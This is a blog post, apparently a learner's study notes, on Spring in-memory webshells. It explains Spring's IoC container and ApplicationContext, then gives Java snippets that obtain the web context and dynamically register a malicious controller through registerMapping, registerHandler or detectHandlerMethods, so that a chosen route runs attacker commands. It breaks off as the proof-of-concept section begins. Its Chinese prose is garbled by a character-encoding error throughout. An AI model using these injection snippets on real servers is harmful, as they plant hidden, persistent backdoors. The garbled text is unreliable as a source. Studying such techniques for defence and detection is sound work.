<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Springå†…å­˜ğŸ | Bloyet&#39;s blog</title>
<link rel="shortcut icon" href="https://bloyet.github.io/favicon.ico?v=1752383988636">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://bloyet.github.io/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="Springå†…å­˜ğŸ | Bloyet&#39;s blog - Atom Feed" href="https://bloyet.github.io/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="åœ¨å­¦ä¹ Springå†…å­˜é©¬ä¹‹å‰ï¼Œä½œè€…æ‰“ç®—å¥½å¥½æ¶è¡¥ä¸€ä¸‹å¼€å‘çš„åŸºæœ¬çŸ¥è¯†ï¼Œä¹Ÿç®—æ˜¯ç»™ä¹‹å‰å·æ‡’çš„è‡ªå·±è¡¥è¯¾å§
ã€ç‹‚ç¥è¯´Javaã€‘JavaWebå…¥é—¨åˆ°å®æˆ˜_å“”å“©å“”å“©_bilibili
ã€ç‹‚ç¥è¯´Javaã€‘SpringBootæœ€æ–°æ•™ç¨‹IDEAç‰ˆé€šä¿—æ˜“æ‡‚_å“”å“©å“”..." />
    <meta name="keywords" content="" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://bloyet.github.io">
  <img class="avatar" src="https://bloyet.github.io/images/avatar.png?v=1752383988636" alt="">
  </a>
  <h1 class="site-title">
    Bloyet&#39;s blog
  </h1>
  <p class="site-description">
    åšé‚£ä¸ªäººçš„æˆ˜å£«ï¼Œå’Œä»–ä¸€èµ·å»ç»å†ï¼Œå¤±è´¥!
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          Home
        </a>
      
    
      
        <a href="/archives" class="menu">
          å½’æ¡£
        </a>
      
    
      
        <a href="/tags" class="menu">
          æ ‡ç­¾
        </a>
      
    
      
        <a href="/friends" class="menu">
          Friends
        </a>
      
    
      
        <a href="/post/about" class="menu">
          å…³äº
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              Springå†…å­˜ğŸ
            </h2>
            <div class="post-info">
              <span>
                2025-07-11
              </span>
              <span>
                18 min read
              </span>
              
            </div>
            
            <div class="post-content-wrapper">
              <div class="post-content" v-pre>
                <p>åœ¨å­¦ä¹ Springå†…å­˜é©¬ä¹‹å‰ï¼Œä½œè€…æ‰“ç®—å¥½å¥½æ¶è¡¥ä¸€ä¸‹å¼€å‘çš„åŸºæœ¬çŸ¥è¯†ï¼Œä¹Ÿç®—æ˜¯ç»™ä¹‹å‰å·æ‡’çš„è‡ªå·±è¡¥è¯¾å§</p>
<p><a href="https://www.bilibili.com/video/BV12J411M7Sj/?spm_id_from=333.1387.collection.video_card.click&amp;vd_source=efb755bbe6728e721e5cf06c81e4366a">ã€ç‹‚ç¥è¯´Javaã€‘JavaWebå…¥é—¨åˆ°å®æˆ˜_å“”å“©å“”å“©_bilibili</a></p>
<p><a href="https://www.bilibili.com/video/BV1PE411i7CV/?vd_source=efb755bbe6728e721e5cf06c81e4366a">ã€ç‹‚ç¥è¯´Javaã€‘SpringBootæœ€æ–°æ•™ç¨‹IDEAç‰ˆé€šä¿—æ˜“æ‡‚_å“”å“©å“”å“©_bilibili</a></p>
<h1 id="springä»‹ç»">Springä»‹ç»</h1>
<p>Springæ˜¯ä¸€ä¸ªè½»é‡çº§çš„Javaå¼€æºæ¡†æ¶ï¼Œç”¨äºé…ç½®ã€ç®¡ç†å’Œç»´æŠ¤Beanï¼ˆç»„ä»¶ï¼‰çš„ä¸€ç§æ¡†æ¶ï¼Œå…¶æ ¸å¿ƒç†å¿µå°±æ˜¯IOC(Inversion of Control,æ§åˆ¶åè½¬) å’Œ AOP(AspectOrientedProgrammingï¼Œ é¢å‘åˆ‡é¢ç¼–ç¨‹)ã€‚</p>
<p>é‡ç‚¹è®²è§£ä¸€ä¸‹æ ¸å¿ƒå†…å®¹</p>
<h2 id="ioc">IOC</h2>
<p>IOCçš„ä¸­æ–‡ç¿»è¯‘ä¸ºï¼šæ§åˆ¶åè½¬</p>
<p>æ ¸å¿ƒç†å¿µæ˜¯ï¼šæŠŠå¯¹è±¡çš„åˆ›å»ºå’Œç®¡ç†æƒäº¤ç»™æ¡†æ¶ï¼Œè€Œä¸æ˜¯ç¨‹åºå‘˜æ‰‹åŠ¨å»åˆ›å»º</p>
<p>ä¾‹å¦‚ï¼š</p>
<p>ä¸ç”¨IOC</p>
<pre><code class="language-java">UserService userService = new UserServiceImpl(); // ç¨‹åºå‘˜è‡ªå·±newå¯¹è±¡
</code></pre>
<p>ä½¿ç”¨IOC</p>
<p>ä½¿ç”¨è¿™ä¸ªæ³¨è§£ï¼Œæˆ‘ä»¬çš„æ¡†æ¶ä¼šåœ¨è¿è¡Œçš„æ—¶å€™è‡ªåŠ¨è¿›è¡Œåˆ›å»º</p>
<pre><code class="language-java">@Autowired
UserService userService; // äº¤ç»™ Spring å®¹å™¨æ¥æ³¨å…¥ï¼Œä¸ç”¨è‡ªå·±new
</code></pre>
<h2 id="aop">AOP</h2>
<p>AOPï¼ˆAspect-Oriented Programmingï¼‰æ˜¯ä¸€ç§é€šè¿‡é¢„å®šä¹‰çš„åˆ‡ç‚¹ï¼ˆPointcutï¼‰å’Œé€šçŸ¥ï¼ˆAdviceï¼‰å°†æ¨ªåˆ‡å…³æ³¨ç‚¹ï¼ˆCross-Cutting Concernsï¼‰æ¨¡å—åŒ–çš„ç¼–ç¨‹èŒƒå¼ã€‚å®ƒå…è®¸å¼€å‘è€…å°†ä¸ä¸šåŠ¡é€»è¾‘æ— å…³ä½†å¯¹å¤šä¸ªæ¨¡å—éƒ½å¾ˆé‡è¦çš„åŠŸèƒ½ï¼ˆå¦‚æ—¥å¿—è®°å½•ã€äº‹åŠ¡ç®¡ç†ã€å®‰å…¨æ§åˆ¶ç­‰ï¼‰ä»æ ¸å¿ƒä¸šåŠ¡é€»è¾‘ä¸­åˆ†ç¦»å‡ºæ¥ï¼Œä»è€Œæé«˜ç³»ç»Ÿçš„æ¨¡å—åŒ–ã€å¯ç»´æŠ¤æ€§å’Œå¯é‡ç”¨æ€§</p>
<p>é€šä¿—ä¸€ç‚¹æ¥è¯´ï¼Œå°±æ˜¯ AOP æ˜¯ä¸€ç§è®©ä½ æŠŠâ€œæ¯ä¸ªåœ°æ–¹éƒ½è¦å†™çš„é‡å¤é€»è¾‘â€ï¼ˆæ¯”å¦‚æ—¥å¿—ã€å®‰å…¨ï¼‰é›†ä¸­å†™ä¸€éï¼Œç„¶åè‡ªåŠ¨ç»‡å…¥æ–¹æ³•æ‰§è¡Œè¿‡ç¨‹ä¸­çš„æŠ€æœ¯ã€‚</p>
<h2 id="springmvc">SpringMVC</h2>
<figure data-type="image" tabindex="1"><img src="https://bloyet.github.io/post-images/1752214131469.png" alt="" loading="lazy"></figure>
<p>å®¢æˆ·ç«¯å‘é€Requestï¼ŒDispatcherServlet(ç­‰åŒäºControlleræ§åˆ¶å™¨)ï¼Œæ§åˆ¶å™¨æ¥æ”¶åˆ°è¯·æ±‚ï¼Œæ¥åˆ°HandlerMappingï¼ˆåœ¨é…ç½®æ–‡ä»¶ä¸­é…ç½®ï¼‰ï¼ŒHandlerMappingä¼šå¯¹URLè¿›è¡Œè§£æï¼Œå¹¶åˆ¤æ–­å½“å‰URLè¯¥äº¤ç»™å“ªä¸ªControlleræ¥å¤„ç†ï¼Œæ‰¾åˆ°å¯¹åº”çš„Controllerä¹‹åï¼ŒControllerå°±è·ŸServerã€JavaBeanè¿›è¡Œäº¤äº’ï¼Œå¾—åˆ°æŸä¸€ä¸ªå€¼ï¼Œå¹¶è¿”å›ä¸€ä¸ªè§†å›¾ï¼ˆModelAndViewè¿‡ç¨‹ï¼‰ï¼ŒDispathcheré€šè¿‡ViewResolverè§†å›¾è§£æå™¨,æ‰¾åˆ°ModelAndViewå¯¹è±¡æŒ‡å®šçš„è§†å›¾å¯¹è±¡,æœ€åï¼Œè§†å›¾å¯¹è±¡è´Ÿè´£æ¸²æŸ“è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ SpringMVC çš„æ ¸å¿ƒç‚¹å°±æ˜¯ <code>DispatchServlet</code></p>
<h2 id="applicationcontext">ApplicationContext</h2>
<p>Spring æ¡†æ¶ä¸­ï¼Œ<code>BeanFactory</code> æ¥å£æ˜¯ <code>Spring</code> IoCå®¹å™¨ çš„å®é™…ä»£è¡¨è€…</p>
<p>Springå®¹å™¨å°±æ˜¯ApplicationContextï¼Œå®ƒæ˜¯ä¸€ä¸ªæ¥å£ç»§æ‰¿äºBeanFactoryï¼Œæœ‰å¾ˆå¤šå®ç°ç±»ã€‚è·å¾—äº†ApplicationContextçš„å®ä¾‹ï¼Œå°±è·å¾—äº†IoCå®¹å™¨çš„å¼•ç”¨ã€‚æˆ‘ä»¬å¯ä»¥ä»ApplicationContextä¸­å¯ä»¥æ ¹æ®Beançš„IDè·å–Beanã€‚</p>
<figure data-type="image" tabindex="2"><img src="https://bloyet.github.io/post-images/1752214131445.png" alt="" loading="lazy"></figure>
<p>å› æ­¤ï¼Œ<code>org.springframework.context.ApplicationContext</code>æ¥å£ä¹Ÿä»£è¡¨äº† <code>IoCå®¹å™¨</code> ï¼Œå®ƒè´Ÿè´£å®ä¾‹åŒ–ã€å®šä½ã€é…ç½®åº”ç”¨ç¨‹åºä¸­çš„å¯¹è±¡(<code>bean</code>)åŠå»ºç«‹è¿™äº›å¯¹è±¡é—´(<code>beans</code>)çš„ä¾èµ–ã€‚</p>
<p>DispatchServletæ˜¯SpringMVCä¸­çš„å‰ç«¯æ§åˆ¶å™¨ï¼Œå¤„ç†æ‰€æœ‰è¯·æ±‚çš„æ ¸å¿ƒç»„ä»¶ï¼Œè€Œå®ƒåˆ›å»ºçš„æ˜¯ä¸€ä¸ªChild Contextï¼Œæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„IOCå®¹å™¨ï¼ˆwebå±‚ä½¿ç”¨ï¼‰</p>
<p>è¿˜æœ‰ä¸€ä¸ªæ˜¯Root ApplicationContextï¼Œå®ƒæ˜¯å…¨å±€çš„ï¼Œè´£ç®¡ç†é¡¹ç›®ä¸­é Web å±‚çš„ Bean ï¼Œç”± ContextLoaderListener åœ¨é¡¹ç›®å¯åŠ¨æ—¶åˆ›å»ºï¼Œè´Ÿè´£åŠ è½½å’Œç®¡ç†æ‰€æœ‰é Web å±‚ Beanï¼Œ ä¿å­˜åˆ° ServletContext ä¸­ä¾›åç»­å­å®¹å™¨å…±äº«ã€‚</p>
<p>æ‰€æœ‰çš„ child å¯ä»¥å–è®¿é—® Root å®¹å™¨ï¼Œä½†æ˜¯ Root å´ä¸èƒ½å»è®¿é—® Child ä¸­çš„å†…å®¹</p>
<p>å½“ç„¶ æ˜¯æ‰€æœ‰çš„contextï¼ˆä¸ä»…ä»…æ˜¯Rootï¼‰ çš„ä¿¡æ¯éƒ½æ˜¯ä¼šå­˜åœ¨ServletContextä¸­çš„</p>
<h1 id="controllerå‹å†…å­˜é©¬">Controllerå‹å†…å­˜é©¬</h1>
<p>åœ¨ Spring ä¸­ï¼Œå½“æˆ‘ä»¬<strong>é™æ€æ³¨å†Œä¸€ä¸ª Controller</strong> æ—¶ï¼Œç¡®å®ä¼š<strong>æŒ‡å®šä¸€ä¸ªç±»çš„æŸä¸ªæ–¹æ³•</strong>å¤„ç†ç‰¹å®šè·¯ç”±ï¼›å½“è¯·æ±‚åˆ°è¾¾è¿™ä¸ªè·¯ç”±æ—¶ï¼ŒSpring ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ã€‚è¿™æ˜¯ Spring MVC çš„æ ¸å¿ƒåŠŸèƒ½ä¹‹ä¸€</p>
<p>é‚£ä¹ˆåŠ¨æ€æ³¨å†Œçš„æ—¶å€™ä¹Ÿæ˜¯ä¸€æ ·çš„é“ç†ï¼Œåªä¸è¿‡æ˜¯ç”±Springè‡ªåŠ¨å®Œæˆï¼Œå˜æˆäº†æˆ‘ä»¬æ‰‹åŠ¨å»æ³¨å†Œï¼Œå½“æˆ‘ä»¬åŠ¨æ€æ³¨å†Œäº†ä¸€ä¸ªæ¶æ„çš„controllerï¼Œå½“æˆ‘ä»¬è®¿é—®æŒ‡å®šè·¯ç”±çš„æ—¶å€™ï¼Œå°±å¯ä»¥è‡ªåŠ¨è°ƒç”¨æ¶æ„æ–¹æ³•ï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<p>é‚£ä¹ˆç°åœ¨å°±æ˜¯æ¥çœ‹æ€ä¹ˆè¿›è¡ŒåŠ¨æ€æ³¨å†Œæ¶æ„çš„controller</p>
<h2 id="æ€è·¯">æ€è·¯ï¼š</h2>
<p>è·å–å½“å‰ä¸Šä¸‹æ–‡</p>
<p>æ³¨å†Œæ¶æ„Controller</p>
<p>é…ç½®è·¯å¾„æ˜ å°„ï¼ˆå…¶å®åœ¨åŠ¨æ€æ³¨å†ŒControllerçš„æ—¶å€™ï¼Œå°±ä¼šè¿›è¡Œæ˜ å°„å™¨çš„é…ç½®ï¼‰</p>
<h2 id="è·å–ä¸Šä¸‹æ–‡">è·å–ä¸Šä¸‹æ–‡</h2>
<p>ä¸€å…±æœ‰å››ç§æ–¹æ³•å¯ä»¥è·å–åˆ°ä¸Šä¸‹æ–‡ï¼š</p>
<h3 id="getcurrentwebapplicationcontext">getCurrentWebApplicationContext</h3>
<pre><code class="language-java">WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
</code></pre>
<p><strong>getCurrentWebApplicationContext</strong> è·å¾—çš„æ˜¯ä¸€ä¸ª <strong>XmlWebApplicationContext</strong> å®ä¾‹ç±»å‹çš„ <strong>Root WebApplicationContext</strong></p>
<h3 id="webapplicationcontextutils">WebApplicationContextUtils</h3>
<pre><code class="language-java">WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
</code></pre>
<p>é€šè¿‡è¿™ç§æ–¹æ³•è·å¾—çš„ä¹Ÿæ˜¯ä¸€ä¸ª <code>Root WebApplicationContext</code>ã€‚å…¶ä¸­ <code>WebApplicationContextUtils.getWebApplicationContext</code> å‡½æ•°ä¹Ÿå¯ä»¥ç”¨ <code>WebApplicationContextUtils.getRequiredWebApplicationContext</code>æ¥æ›¿æ¢ã€‚</p>
<h3 id="requestcontextutils">RequestContextUtils</h3>
<pre><code class="language-java">WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
</code></pre>
<p>é€šè¿‡ <code>ServletRequest</code> ç±»çš„å®ä¾‹æ¥è·å¾— <code>Child WebApplicationContext</code>ã€‚</p>
<h3 id="getattribute"><strong>getAttribute</strong></h3>
<pre><code class="language-java">WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
</code></pre>
<p>è¿™ç§æ–¹å¼ä¸å‰å‡ ç§çš„æ€è·¯å°±ä¸å¤ªä¸€æ ·äº†ï¼Œå› ä¸ºæ‰€æœ‰çš„Contextåœ¨åˆ›å»ºåï¼Œéƒ½ä¼šè¢«ä½œä¸ºä¸€ä¸ªå±æ€§æ·»åŠ åˆ°äº†ServletContextä¸­ã€‚æ‰€ä»¥é€šè¿‡ç›´æ¥è·å¾—ServletContexté€šè¿‡å±æ€§Contextæ‹¿åˆ° Child WebApplicationContext</p>
<h2 id="æ³¨å†Œæ¶æ„controller">æ³¨å†Œæ¶æ„Controller</h2>
<p>æˆ‘ä»¬è¦æƒ³å¯¹Spring Controller çš„åŠ¨æ€æ³¨å†Œï¼Œå°±æ˜¯å¯¹ RequestMappingHandlerMappingæ³¨å…¥çš„è¿‡ç¨‹ã€‚</p>
<p>RequestMappingHandlerMappingæ˜¯springMVCé‡Œé¢çš„æ ¸å¿ƒBeanï¼ŒspringæŠŠæˆ‘ä»¬çš„controllerè§£ææˆRequestMappingInfoå¯¹è±¡ï¼Œç„¶åå†æ³¨å†Œè¿›RequestMappingHandlerMappingä¸­ï¼Œè¿™æ ·è¯·æ±‚è¿›æ¥ä»¥åå°±å¯ä»¥æ ¹æ®è¯·æ±‚åœ°å€è°ƒç”¨åˆ°Controllerç±»é‡Œé¢äº†ã€‚</p>
<p>RequestMappingHandlerMappingå¯¹è±¡æœ¬èº«æ˜¯springæ¥ç®¡ç†çš„ï¼Œå¯ä»¥é€šè¿‡<strong>ApplicationContext</strong>å–åˆ°ï¼Œæ‰€ä»¥å¹¶ä¸éœ€è¦æˆ‘ä»¬æ–°å»º</p>
<p>è€Œåœ¨SpringMVCæ¡†æ¶ä¸‹ï¼Œä¼šæœ‰ä¸¤ä¸ªApplicationContextï¼Œ</p>
<p>ä¸€ä¸ªæ˜¯Spring IOCçš„ä¸Šä¸‹æ–‡ï¼Œè¿™ä¸ªæ˜¯åœ¨java webæ¡†æ¶çš„Listeneré‡Œé¢é…ç½®ï¼Œå°±æ˜¯æˆ‘ä»¬ç»å¸¸ç”¨çš„web.xmlé‡Œé¢çš„org.springframework.web.context.ContextLoaderListenerï¼Œç”±å®ƒæ¥å®ŒæˆIOCå®¹å™¨çš„åˆå§‹åŒ–å’Œbeanå¯¹è±¡çš„æ³¨å…¥ã€‚</p>
<p>å¦å¤–ä¸€ä¸ªæ˜¯ApplicationContextæ˜¯ç”±<strong>org.springframework.web.servlet.DispatcherServlet</strong>å®Œæˆçš„ï¼Œå…·ä½“æ˜¯åœ¨org.springframework.web.servlet.FrameworkServlet#initWebApplicationContext()è¿™ä¸ªæ–¹æ³•åšçš„ã€‚è€Œè¿™ä¸ªè¿‡ç¨‹é‡Œé¢ä¼šå®ŒæˆRequestMappingHandlerMappingè¿™ä¸ªå¯¹è±¡çš„åˆå§‹åŒ–ã€‚</p>
<p>æ˜ å°„å™¨ï¼š å®ƒè´Ÿè´£ç»´æŠ¤ <strong>URL è·¯å¾„ï¼ˆæˆ–å…¶ä»–æ¡ä»¶ï¼‰åˆ°å¤„ç†å™¨ï¼ˆå¦‚ Controller æ–¹æ³•ï¼‰çš„æ˜ å°„å…³ç³»</strong>ã€‚</p>
<p>Spring 2.5 å¼€å§‹åˆ° Spring 3.1 ä¹‹å‰ä¸€èˆ¬ä½¿ç”¨<br>
<code>org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping</code><br>
æ˜ å°„å™¨ ï¼›</p>
<p>Spring 3.1 å¼€å§‹åŠä»¥åä¸€èˆ¬å¼€å§‹ä½¿ç”¨æ–°çš„<br>
<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</code><br>
æ˜ å°„å™¨æ¥æ”¯æŒ@Contollerå’Œ@RequestMappingæ³¨è§£ã€‚</p>
<h3 id="registermapping">registerMapping</h3>
<p>åœ¨Spring 4.0åŠä»¥åï¼Œå¯ä»¥ä½¿ç”¨registerMappingç›´æ¥æ³¨å†ŒrequestMapping</p>
<figure data-type="image" tabindex="3"><img src="https://bloyet.github.io/post-images/1752214131485.png" alt="" loading="lazy"></figure>
<p>åœ¨åˆšåˆšå…¶å®ä¹Ÿè¯´äº† springä¼šæŠŠcontrollerè§£æä¸ºRequestMappingInfoå¯¹è±¡ï¼Œç„¶ååœ¨æ³¨å†Œè¿›RequestMappingHandlerMappingï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨registerMappingæ–¹æ³•ä¸­çš„å‚æ•°ï¼Œä¹Ÿæ˜¯RequestMappingInfoç±» æ‰€ä»¥åœ¨æ³¨å†Œä¹‹å‰æˆ‘ä»¬è¿˜éœ€è¦çœ‹ä¸€ä¸‹RequestMappingInfoç±»</p>
<p>å¯ä»¥çœ‹åˆ° æ„é€ æ–¹æ³•æ˜¯æœ‰éå¸¸å¤šçš„å‚æ•°çš„ï¼Œä½†æ˜¯æœ‰ç”¨çš„å…¶å®å°±ä¸¤ä¸ª ä¸€å…±æ˜¯</p>
<pre><code class="language-java">private RequestMappingInfo(@Nullable String name, @Nullable PathPatternsRequestCondition pathPatternsCondition, @Nullable PatternsRequestCondition patternsCondition, RequestMethodsRequestCondition methodsCondition, ParamsRequestCondition paramsCondition, HeadersRequestCondition headersCondition, ConsumesRequestCondition consumesCondition, ProducesRequestCondition producesCondition, RequestConditionHolder customCondition, BuilderConfiguration options) {
    Assert.isTrue(pathPatternsCondition != null || patternsCondition != null, &quot;Neither PathPatterns nor String patterns condition&quot;);
    this.name = StringUtils.hasText(name) ? name : null;
    this.pathPatternsCondition = pathPatternsCondition;
    this.patternsCondition = patternsCondition;
    this.methodsCondition = methodsCondition;
    this.paramsCondition = paramsCondition;
    this.headersCondition = headersCondition;
    this.consumesCondition = consumesCondition;
    this.producesCondition = producesCondition;
    this.customConditionHolder = customCondition;
    this.options = options;
    this.hashCode = calculateHashCode(this.pathPatternsCondition, this.patternsCondition, this.methodsCondition, this.paramsCondition, this.headersCondition, this.consumesCondition, this.producesCondition, this.customConditionHolder);
}
</code></pre>
<p>ä¸€ä¸ªæ˜¯æŒ‡å®šcontrollerçš„è·¯å¾„ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¯´çš„è·¯ç”±ï¼ˆè®¾ç½®å¥½æ˜ å°„å…³ç³»ï¼‰</p>
<p>å¦å¤–ä¸€ä¸ªæ˜¯æŒ‡å®šè¯·æ±‚æ–¹å¼ï¼Œè®¾ç½®ä¸ºä¸é™åˆ¶å°±å¥½</p>
<p>registerMappingæ–¹æ³•ä¸­çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œå…¶å®ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯¹åº”çš„æ¶æ„ç±»  ç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯å¯¹åº”çš„æ¶æ„æ–¹æ³•</p>
<p>å…¶å®å¾ˆå¥½ç†è§£ï¼ŒRequestMappingInfoç±»æŒ‡å®šæˆ‘ä»¬æ¶æ„ç±»çš„æ˜ å°„å…³ç³»ï¼Œä½¿æˆ‘ä»¬è®¿é—®å¯¹åº”çš„è·¯ç”±æ—¶ï¼Œå°±ä¼šå¯¹åº”ä¸€ä¸ªç±»ï¼Œè€Œåœ¨MVCæ¶æ„ä¸­ï¼Œæˆ‘ä»¬è®¿é—®ä¸€ä¸ªè·¯ç”±æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ä¸€ä¸ªæ–¹æ³•çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–¹æ³•ï¼Œå°±æ˜¯åœ¨è¿™é‡Œè¿›è¡ŒæŒ‡å®šçš„</p>
<pre><code class="language-java">// 1. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— RequestMappingHandlerMapping çš„å®ä¾‹
RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
// 2. é€šè¿‡åå°„è·å¾—è‡ªå®šä¹‰ controller ä¸­å”¯ä¸€çš„ Method å¯¹è±¡
Method method = æ¶æ„ç±»çš„å­—èŠ‚ç .getDeclaredMethods())[0];
// 3. å®šä¹‰è®¿é—® controller çš„ URL åœ°å€
PatternsRequestCondition url = new PatternsRequestCondition(&quot;/hahaha&quot;);
// 4. å®šä¹‰å…è®¸è®¿é—® controller çš„ HTTP æ–¹æ³•ï¼ˆGET/POSTï¼‰
RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
// 5. åœ¨å†…å­˜ä¸­åŠ¨æ€æ³¨å†Œ controller
RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
r.registerMapping(info, Class.forName(&quot;æ¶æ„Controller&quot;).newInstance(), method);
</code></pre>
<h3 id="registerhandler">registerHandler</h3>
<p>(ç‰ˆæœ¬å¤è€ï¼Œæš‚ä¸”å°±ä¸å¤ç°äº†ï¼ˆï¼šï¼‰<br>
å‚è€ƒä¸Šé¢çš„ HandlerMapping æ¥å£ç»§æ‰¿å…³ç³»å›¾ï¼Œé’ˆå¯¹ä½¿ç”¨ DefaultAnnotationHandlerMapping æ˜ å°„å™¨çš„åº”ç”¨ï¼Œå¯ä»¥æ‰¾åˆ°å®ƒç»§æ‰¿çš„é¡¶å±‚ç±»org.springframework.web.servlet.handler.AbstractUrlHandlerMapping<br>
åœ¨å…¶registerHandler()æ–¹æ³•ä¸­<br>
<a href="https://yyjccc.github.io/img/3-12/15.png"><img src="https://bloyet.github.io/post-images/1752214131501.png" alt="" loading="lazy"></a><br>
è¯¥æ–¹æ³•æ¥å— urlPathå‚æ•°å’Œ handlerå‚æ•°ï¼Œå¯ä»¥åœ¨ this.getApplicationContext() è·å¾—çš„ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­å¯»æ‰¾åå­—ä¸º handler å‚æ•°å€¼çš„ bean, å°† url å’Œ controller å®ä¾‹ bean æ³¨å†Œåˆ° handlerMap ä¸­</p>
<pre><code>// 1. åœ¨å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­æ³¨å†Œä¸€ä¸ªåä¸º dynamicController çš„ Webshell controller å®ä¾‹ bean context.getBeanFactory().registerSingleton(&quot;dynamicController&quot;, Class.forName(&quot;me.landgrey.SSOLogin&quot;).newInstance()); // 2. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— DefaultAnnotationHandlerMapping çš„å®ä¾‹ bean org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class); // 3. åå°„è·å¾— registerHandler Method java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(&quot;registerHandler&quot;, String.class, Object.class); m1.setAccessible(true); // 4. å°† dynamicController å’Œ URL æ³¨å†Œåˆ° handlerMap ä¸­ m1.invoke(dh, &quot;/favicon&quot;, &quot;dynamicController&quot;);
</code></pre>
<h3 id="detecthandlermethods">detectHandlerMethods</h3>
<p>å‚è€ƒä¸Šé¢çš„ HandlerMapping æ¥å£ç»§æ‰¿å…³ç³»å›¾ï¼Œé’ˆå¯¹ä½¿ç”¨ RequestMappingHandlerMapping æ˜ å°„å™¨çš„åº”ç”¨ï¼Œå¯ä»¥æ‰¾åˆ°å®ƒç»§æ‰¿çš„é¡¶å±‚ç±»org.springframework.web.servlet.handler.AbstractHandlerMethodMapping<br>
åœ¨å…¶detectHandlerMethods() æ–¹æ³•ä¸­</p>
<pre><code>protected void detectHandlerMethods(Object handler) {    Class&lt;?&gt; handlerType = handler instanceof String ? this.getApplicationContext().getType((String)handler) : handler.getClass();    final Class&lt;?&gt; userType = ClassUtils.getUserClass(handlerType);    Set&lt;Method&gt; methods = HandlerMethodSelector.selectMethods(userType, new MethodFilter() {        public boolean matches(Method method) {            return AbstractHandlerMethodMapping.this.getMappingForMethod(method, userType) != null;        }    });    Iterator var6 = methods.iterator();    while(var6.hasNext()) {        Method method = (Method)var6.next();        T mapping = this.getMappingForMethod(method, userType);        this.registerHandlerMethod(handler, method, mapping);    } }
</code></pre>
<p>è¯¥æ–¹æ³•ä»…æ¥å—handlerå‚æ•°ï¼ŒåŒæ ·å¯ä»¥åœ¨ this.getApplicationContext() è·å¾—çš„ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­å¯»æ‰¾åå­—ä¸º handler å‚æ•°å€¼çš„ bean, å¹¶æ³¨å†Œ controller çš„å®ä¾‹ bean</p>
<pre><code>context.getBeanFactory().registerSingleton(&quot;dynamicController&quot;, Class.forName(&quot;æ¶æ„Controller&quot;).newInstance()); org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class); java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(&quot;detectHandlerMethods&quot;, Object.class); m1.setAccessible(true); m1.invoke(requestMappingHandlerMapping, &quot;dynamicController&quot;);
</code></pre>
<h2 id="poc">POC</h2>
<p>æˆ‘è¿™é‡Œå°±ç”¨springboot 2.5.6ç‰ˆæœ¬è¿›è¡Œå¤ç°äº†</p>
<p>æ€è·¯è¿˜æ˜¯å¾ˆç®€å•çš„ï¼š</p>
